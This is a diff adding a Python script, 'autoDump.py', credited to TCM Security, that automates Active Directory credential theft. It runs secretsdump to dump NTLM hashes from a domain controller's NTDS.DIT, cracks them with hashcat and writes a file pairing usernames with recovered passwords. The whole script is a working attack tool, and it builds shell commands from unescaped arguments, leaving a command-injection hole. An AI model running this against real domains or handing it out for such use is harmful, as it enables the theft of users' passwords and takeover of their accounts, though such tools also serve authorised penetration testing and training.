@@ -1,0 +1,102 @@
+#!/usr/bin/python3
+#Title: autoDump.py
+#Author: Max Ahartz
+#Credit: TCM Security
+
+import argparse
+import subprocess
+import re
+
+def run_secretsdump(args):
+    if args.user:
+        cmd = f"secretsdump.py {args.domain}/{args.user}:'{args.password}'@{args.ipaddress} -just-dc-ntlm"
+    else:
+        cmd = f"secretsdump.py -k -no-pass {args.domain}"
+
+    print("Secretsdump is working...\n")
+
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    lines = result.stdout.split('\n')
+
+    start = False
+    relevant_lines = []
+    nt_hashes = []
+
+    for line in lines:
+        if "[*] Using the DRSUAPI method to get NTDS.DIT secrets" in line:
+            start = True
+            continue
+        if start and "[*] Kerberos keys grabbed" in line:
+            break
+        
+        if start and not line.startswith(("Guest", "krbtgt", "[*]")) and "$:" not in line:
+            relevant_lines.append(line)
+            match = re.search(r':([a-fA-F0-9]{32}):::', line)
+            if match:
+                nt_hashes.append(match.group(1))
+
+    with open('ntds-hashes.txt', 'w') as file:
+        file.write("\n".join(relevant_lines))
+    
+    with open('nt-hashes.txt', 'w') as file:
+        file.write('\n'.join(nt_hashes))
+
+def run_hashcat(args):
+    hash_cat = f"hashcat -m 1000 nt-hashes.txt {args.wordlist}"
+    if args.rules:
+        hash_cat += " -O"
+    print(f"Executing: {hash_cat}")
+
+    result = subprocess.run(hash_cat, shell=True, capture_output=True, text=True)
+    #print(result)
+    
+    recovered_match = re.search(r'Recovered\.\.\.\.\.\.\.\.: (\d+)/(\d+)', result.stdout)
+    #print(recovered_match)
+    
+    if recovered_match:
+        recovered_hashes = int(recovered_match.group(1))
+        total_hashes = int(recovered_match.group(2))
+        print(f"\n{recovered_hashes} hashes were cracked out of {total_hashes}.")
+
+        if recovered_hashes > 0:
+            run_hashcat_show(args)
+
+def run_hashcat_show(args):
+    hashcat_show_cmd = f"hashcat -m 1000 nt-hashes.txt --show"
+    show_result = subprocess.run(hashcat_show_cmd, shell=True, capture_output=True, text=True)
+    
+    with open("ntds-hashes.txt", "r") as file:
+        original_data = file.readlines()
+
+    hash_to_user = {re.search(r':([a-fA-F0-9]{32}):::', line).group(1): line.split(":")[0] for line in original_data}
+    cracked_data = show_result.stdout.split("\n")
+
+    cracked_users = {}
+    for line in cracked_data:
+        if ":" in line:
+            hash_value, password = line.split(":")
+            user = hash_to_user[hash_value]
+            cracked_users[user] = password
+
+    with open(f"{args.domain}-cracked-users.txt", "w") as file:
+        for user, password in cracked_users.items():
+            file.write(f"{user}:{password}\n")
+
+    print(f"\n\nResults are saved to {args.domain}-cracked-users.txt")
+
+def main():
+    parser = argparse.ArgumentParser(description="...Options...")
+    parser.add_argument('-d', '--domain', required=True, help='Domain name')
+    parser.add_argument('-u', '--user', required=False, help='Username')
+    parser.add_argument('-p', '--password', required=False, help='Password')
+    parser.add_argument('-ip', '--ipaddress', required=False, help='IP address')
+    parser.add_argument('-w', '--wordlist', required=True, help='Wordlist for hashcat')
+    parser.add_argument('-r', '--rules', default=None, help='Hashcat rules')
+    parser.add_argument('-O', '--optimized', action='store_true', help='Optimized mode')
+
+    args = parser.parse_args()
+    run_secretsdump(args)
+    run_hashcat(args)
+
+if __name__ == "__main__":
+    main()
